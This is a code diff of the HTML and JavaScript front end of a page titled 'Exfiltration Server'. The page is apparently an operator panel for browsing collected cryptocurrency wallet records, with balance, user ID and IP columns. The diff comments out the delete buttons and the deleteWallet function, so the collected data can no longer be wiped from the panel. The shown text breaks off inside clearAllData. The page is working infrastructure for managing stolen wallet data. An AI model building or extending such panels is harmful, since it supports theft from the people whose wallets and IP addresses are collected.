@@ -55,7 +55,7 @@
 <div class="header">
 <h1>🚀 Exfiltration Server</h1>
 <button onclick="logout()">Logout</button>
-<button onclick="clearAllData()" style="background:#ff0000">Clear All</button>
+<!-- <button onclick="clearAllData()" style="background:#ff0000">Clear All</button> -->
 <button onclick="refreshData()">Refresh</button>
 </div>
 <div class="stats-grid" id="stats"></div>
@@ -69,7 +69,7 @@
     <th style="min-width:100px">Balance</th>
     <th style="min-width:120px">User ID</th>
     <th style="min-width:100px">IP</th>
-    <th style="min-width:80px">Action</th>
+    <!-- <th style="min-width:80px">Action</th> -->
 </tr>
 </thead>
 <tbody id="walletsBody"></tbody>
@@ -219,12 +219,12 @@ function changePage(p){
     loadWallets();
 }
 
-async function deleteWallet(id){
-    if(confirm('Delete this wallet?')){
-        await fetch('/api/wallets/'+id,{method:'DELETE',headers:{'Authorization':'Basic '+token}});
-        refreshData();
-    }
-}
+// async function deleteWallet(id){
+//     if(confirm('Delete this wallet?')){
+//         await fetch('/api/wallets/'+id,{method:'DELETE',headers:{'Authorization':'Basic '+token}});
+//         refreshData();
+//     }
+// }
 
 async function clearAllData(){
     if(confirm('⚠️ Delete ALL wallet data?')){
